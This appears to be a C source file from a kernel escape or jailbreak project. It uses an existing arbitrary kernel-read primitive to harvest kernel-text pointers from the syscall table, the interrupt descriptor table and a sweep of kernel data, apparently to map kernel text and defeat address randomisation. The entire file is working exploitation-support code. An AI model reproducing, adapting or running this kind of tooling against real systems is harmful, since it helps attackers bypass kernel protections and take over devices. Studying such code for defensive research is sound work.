/*
 * ot_harvest.c -- data-side kernel-text anchor harvest.
 * See ot_harvest.h.
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 */
#include "ot_harvest.h"

#include "escape.h"

#include <stdint.h>
#include <string.h>

#define OT_SCAN_MAX 0x4000000ULL
#define OT_WIN 0x100000ULL
#define OT_OVL 0x2000ULL
#define OT_WIN_BUF (OT_WIN + OT_OVL)

#define SYSENT_STRIDE 0x30
#define SYSENT_SY_CALL 0x8

/* Minimum consecutive stride-8 text pointers that count as a pointer table. */
#define TABLE_MIN 8

static uint8_t g_win[OT_WIN_BUF];

static uint16_t rd16(const uint8_t *p) {
  uint16_t v;
  memcpy(&v, p, sizeof v);
  return v;
}
static uint32_t rd32(const uint8_t *p) {
  uint32_t v;
  memcpy(&v, p, sizeof v);
  return v;
}
static uint64_t rd64(const uint8_t *p) {
  uint64_t v;
  memcpy(&v, p, sizeof v);
  return v;
}

/* A kernel-text function pointer: canonical image VA below kdata. */
static int text_ptr(uint64_t v) {
  return v >= 0xffffffff80000000ULL && ot_ktext && v >= ot_ktext &&
         v < ot_kdata;
}

static void note(struct ot_harvest *h, uint64_t p) {
  if (p < h->ptr_min)
    h->ptr_min = p;
  if (p > h->ptr_max)
    h->ptr_max = p;
}

static size_t rd_win(uint64_t base) {
  if (ot_rd(ot_kdata + base, g_win, OT_WIN_BUF) != 0)
    return 0;
  return OT_WIN_BUF;
}

static void harvest_syscalls(uint64_t sv_table, uint64_t sv_size,
                             struct ot_harvest *h) {
  if (!sv_table || sv_size < 16 || sv_size > 4096)
    return;
  for (uint64_t i = 0; i < sv_size; i++) {
    uint64_t call = 0;
    if (ot_rd(sv_table + i * SYSENT_STRIDE + SYSENT_SY_CALL, &call, 8) != 0)
      break;
    if (text_ptr(call)) {
      h->sys_calls++;
      note(h, call);
    }
  }
}

static void harvest_idt(uint64_t idt_off, struct ot_harvest *h) {
  if (!idt_off)
    return;
  uint8_t idt[256 * 16];
  if (ot_rd(ot_kdata + idt_off, idt, sizeof idt) != 0)
    return;
  for (int i = 0; i < 256; i++) {
    const uint8_t *p = idt + i * 16;
    uint64_t off = ((uint64_t)rd32(p + 8) << 32) | ((uint64_t)rd16(p + 6) << 16) |
                   rd16(p);
    if (text_ptr(off)) {
      h->idt_handlers++;
      note(h, off);
    }
  }
}

static void harvest_sweep(struct ot_harvest *h) {
  for (uint64_t base = 0; base < OT_SCAN_MAX; base += OT_WIN) {
    size_t got = rd_win(base);
    if (!got)
      continue;
    uint64_t run = 0, run_off = 0;
    for (size_t i = 0; i + 8 <= got; i += 8) {
      uint64_t p = rd64(g_win + i);
      if (text_ptr(p)) {
        h->sweep_ptrs++;
        note(h, p);
        if (run == 0)
          run_off = base + i;
        run++;
        if (run > h->table_max) {
          h->table_max = run;
          h->table_max_off = run_off;
        }
      } else {
        if (run >= TABLE_MIN)
          h->tables++;
        run = 0;
      }
    }
    if (run >= TABLE_MIN)
      h->tables++;
  }
}

void ot_harvest_run(uint64_t sv_table, uint64_t sv_size, uint64_t idt_off,
                    struct ot_harvest *h) {
  for (unsigned i = 0; i < sizeof *h; i++)
    ((uint8_t *)h)[i] = 0;
  h->ptr_min = ~0ULL;

  if (!ot_ktext || ot_ktext >= ot_kdata)
    return;

  harvest_syscalls(sv_table, sv_size, h);
  harvest_idt(idt_off, h);
  harvest_sweep(h);

  if (h->ptr_min == ~0ULL)
    h->ptr_min = 0;
  h->ktext_ok = h->ptr_min >= ot_ktext;
  h->ktext_gap = h->ptr_min >= ot_ktext ? h->ptr_min - ot_ktext : 0;
}
